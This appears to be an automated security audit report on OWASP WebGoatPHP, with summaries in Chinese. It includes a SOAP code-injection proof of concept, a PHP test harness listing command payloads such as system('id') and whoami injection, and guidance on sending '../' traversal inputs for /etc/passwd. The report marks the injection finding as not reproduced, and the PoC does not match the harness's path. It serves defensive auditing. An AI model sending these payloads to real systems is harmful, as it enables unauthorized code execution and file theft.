exploit.exploit_path: 用户通过SOAP请求发送恶意参数 -> 经serialize/deserialize过程传入eval函数 -> 执行任意PHP代码
exploit.attack_vector: SOAP XML请求中的某个元素（如参数值）
exploit.exploit_code:
import requests

url = "http://target/soap/server.php"
payload = "echo AUDITAGENTX_RCE_1337;"
xml_request = f'''<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="urn:example">
<SOAP-ENV:Body>
<ns1:someFunction>
<param>{payload}</param>
</ns1:someFunction>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>'''
headers = {"Content-Type": "text/xml"}
response = requests.post(url, data=xml_request, headers=headers)
print(response.text)
exploit.verification_method: 执行exploit_code中的Python脚本，检查响应中是否包含'AUDITAGENTX_RCE_1337'字符串。如果包含，则利用成功。

harness.harness_code:
<?php
// Mock eval function
$mock_eval_calls = [];
function mock_eval_internal($code) {
    global $mock_eval_calls;
    $mock_eval_calls[] = $code;
}

// Define a minimal nusoap_server class to replicate the vulnerable function
class nusoap_server {
    public $methodname = '';
    public $methodparams = [];
    public $class = '';
    public $delim = '..';
    public $debug = '';
    public $methodreturn = null;

    public function debug($msg) {
        // mock debug
    }

    public function appendDebug($msg) {
        // mock appendDebug
    }

    public function varDump($var) {
        return var_export($var, true);
    }

    public function invoke_method() {
        // Replicate the vulnerable code, replacing eval with mock
        $funcCall = '$this->methodreturn = ' . $this->methodname . '(' . $this->serialize_params($this->methodparams) . ');';
        if (true) { // simplified condition from original
            mock_eval_internal($funcCall);
        } else {
            // other branches not relevant
        }
        $this->debug('in invoke_method, methodreturn:');
        $this->appendDebug($this->varDump($this->methodreturn));
        $this->debug("in invoke_method, called method $this->methodname, received data of type " . gettype($this->methodreturn));
    }

    private function serialize_params($params) {
        $parts = [];
        foreach ($params as $p) {
            $parts[] = var_export($p, true);
        }
        return implode(', ', $parts);
    }
}

// Test payloads
$payloads = [
    "phpinfo()",
    "system('id')",
    "echo 'pwned';",
    "exec('ls')",
    "1; system('whoami'); //"
];

$triggered = false;
$last_payload = '';
$last_argument = '';
$detected = false;

foreach ($payloads as $payload) {
    // Reset mock
    global $mock_eval_calls;
    $mock_eval_calls = [];
    
    // Create server instance
    $server = new nusoap_server();
    $server->methodname = $payload; // This will be injected into eval
    $server->methodparams = ['arg1', 'arg2']; // dummy params
    
    // Call the vulnerable function
    $server->invoke_method();
    
    // Check if mock_eval was called with our payload
    if (!empty($mock_eval_calls)) {
        $called_code = $mock_eval_calls[0];
        // The called code is like: '$this->methodreturn = phpinfo()(...);'
        // We check if the original payload appears in the called code
        if (strpos($called_code, $payload) !== false) {
            $triggered = true;
            $last_payload = $payload;
            $last_argument = $called_code;
            $detected = true;
            break;
        }
    }
}

if ($detected) {
    echo "AUDITAGENTX_VULN_TRIGGERED\n";
    echo "AUDITAGENTX_RESULT_JSON={\"triggered\":true,\"target_function_called\":true,\"sink_called\":true,\"sink_name\":\"eval (mocked)\",\"captured_argument\":\"" . addslashes($last_argument) . "\",\"payload\":\"" . addslashes($last_payload) . "\",\"trigger_detail\":\"eval called with user-controlled methodname containing payload\"}\n";
} else {
    echo "AUDITAGENTX_NO_TRIGGER\n";
    echo "AUDITAGENTX_RESULT_JSON={\"triggered\":false,\"target_function_called\":true,\"sink_called\":false,\"sink_name\":\"eval (mocked)\",\"captured_argument\":\"\",\"payload\":\"\",\"trigger_detail\":\"No eval triggered by any payload\"}\n";
}

tool_calls.name: retrieve_security_knowledge
tool_calls.purpose: Retrieve CWE/OWASP security knowledge through the MCP server.

top_result.title: Path Traversal Verification Playbook
top_result.summary: Verify path traversal by confirming attacker-controlled input reaches a filesystem API without canonicalization or a base-directory allowlist.
verification_checks: Confirm the user-controlled value is concatenated or joined into a filesystem path.
Check whether the code canonicalizes the path (realpath/abspath) and enforces an allowlisted base directory.
If a local target runs, send ../ or encoded ..%2f payloads for a known file (app config, /etc/passwd) and look for file contents in the response.
If no target exists, record dynamic_verdict=not_executed instead of not_reproduced.
false_positive_signals: The resolved path is validated to stay under an allowlisted base directory.
The filename is a fixed server-side constant or comes from a strict allowlist.
The framework normalizes and rejects traversal sequences before use.
remediation: Canonicalize the path and confirm it stays under an allowlisted base directory.
Reject traversal sequences and use safe file APIs.

security_knowledge.title: SQL Injection
security_knowledge.summary: Externally influenced input is used to construct SQL without sufficient separation between data and query structure.
verification_checks: Confirm user-controlled input reaches SQL construction or execution.
Confirm the query is built with string concatenation, interpolation, or formatting.
Confirm no prepared statement, parameter binding, or strong type conversion separates data from SQL.
false_positive_signals: The sink uses parameter placeholders with a separate parameter tuple/list.
The value is converted to a strict numeric type before reaching SQL.
The SQL statement is a static literal and user input is not interpolated.
remediation: Use prepared statements or parameterized queries.
Do not concatenate user-controlled strings into SQL.
Run database users with least privilege and avoid detailed SQL errors in responses.

security_knowledge.title: Insecure Deserialization
security_knowledge.summary: Untrusted data is deserialized without validation, allowing object injection or remote code execution.
owasp: A08:2021 Software and Data Integrity Failures
verification_checks: Confirm untrusted input is passed to a deserialization sink.
Confirm the deserializer can instantiate arbitrary classes or call __reduce__.
Confirm no integrity check (HMAC/signature) protects the serialized blob.
false_positive_signals: Only json.loads / yaml.safe_load is used on the untrusted data.
The serialized data is signed and verified before deserialization.
The input is a trusted, application-generated constant.
remediation: Prefer safe formats (JSON) and safe loaders (yaml.safe_load).
Never deserialize untrusted data with pickle/unserialize/ObjectInputStream.
If unavoidable, sign+verify payloads and restrict allowed classes.

summary.executive_summary: 本次审计对象为 OWASP-WebGoatPHP，来源为 https://github.com/OWASP/OWASPWebGoatPHP，项目主要语言为 PHP、JavaScript、Shell，框架识别结果为 未识别，共解析 1252 个文件、147297 行代码。AuditAgentX 的流程先由 RepoParserAgent 建立项目画像，再由 StaticScanAgent 调用静态规则和 SAST 工具产生候选漏洞，AuditAgent 补充语义层面的风险发现，VerifyAgent 独立复核并过滤误报，随后 ExploitAgent/DynamicVerifier 对可验证漏洞生成授权 PoC 并保存运行证据，最后由 SummaryAgent 汇总为本报告。当前共发现 464 条风险，其中 Critical 0 条、High 36 条、Medium 258 条、Low 170 条；静态分析覆盖 464 条，动态验证覆盖 1 条，其中 0 条已复现。主要风险类型集中在 XSS(114)、detect-non-literal-regexp(78)、Command Injection(43)、Path Traversal(41)，总体风险评级为 HIGH。
summary.static_summary: 静态分析阶段合并 SAST 工具、硬编码密钥检测和自定义规则结果，共形成 464 条静态风险。主要来源分布为 custom-taint(319)、semgrep(145)。这些结果先作为候选项进入 VerifyAgent，避免仅凭规则命中直接下结论。
summary.dynamic_summary: 动态验证阶段对 1 条漏洞保存了运行证据，其中 0 条具备可复现结果。报告中的 Source、Sink、调用路径、PoC 和 runtime 证据共同构成证据链。
workflow_summary: RepoParserAgent：解析仓库结构、语言、框架、入口文件、依赖与代码规模，为后续审计提供项目画像。
StaticScanAgent：调用 Semgrep、Gitleaks、自定义规则等工具进行静态扫描，产出 SQL 注入、命令注入、路径遍历、硬编码密钥等候选风险。
AuditAgent：基于 LLM 对代码上下文做语义审计，补充传统 SAST 工具可能漏掉的业务逻辑与调用链风险。
VerifyAgent：独立复核候选漏洞，调用本地代码上下文读取、启发式分析和 SAST replay 工具过滤误报。
ExploitAgent / DynamicVerifier：为已确认漏洞生成授权 PoC、触发路径和利用代码，并在本地靶场或授权目标上保存动态验证证据。
SummaryAgent：汇总项目概况、静态/动态结果、证据链和修复优先级，生成执行摘要与修改建议。

remediation_plan.title: 优先修复 Critical/High 漏洞
remediation_plan.detail: 先处理已确认、已复现或处于核心入口路径上的高危问题，修复后重新扫描并保留复测证据。

remediation_plan.title: 按漏洞类型批量治理
remediation_plan.detail: 对 SQL 注入、命令注入、路径遍历等同类问题统一采用参数化查询、白名单校验和安全 API。

remediation_plan.title: 补充动态验证覆盖
remediation_plan.detail: 为高危候选漏洞配置本地靶场或授权 URL，让 ExploitAgent/DynamicVerifier 生成可复现证据。

remediation_plan.title: 纳入持续审计流程
remediation_plan.detail: 将静态扫描、VerifyAgent 复核和报告生成接入提交前或 CI 流程，避免修复后回归。

summary.conclusion: 综合项目规模、漏洞数量、严重等级和验证结果，当前项目处于 HIGH 风险水平。建议先处理已确认的高危/可复现漏洞，再统一治理同类输入校验、权限控制、敏感信息管理和依赖安全问题。
